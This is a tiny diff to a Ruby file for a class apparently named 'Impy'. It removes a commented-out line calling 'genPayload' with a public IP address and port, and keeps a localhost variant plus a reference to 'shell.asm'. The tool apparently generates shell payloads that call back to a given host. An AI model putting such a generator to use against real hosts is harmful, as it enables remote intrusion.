@@ -136,5 +136,4 @@ class Impy
 end
 
 # impy = Impy.new('shell.asm')
-# puts impy.genPayload("163.172.213.104", "8080")
 # puts impy.genPayload("127.0.0.1", "8080")
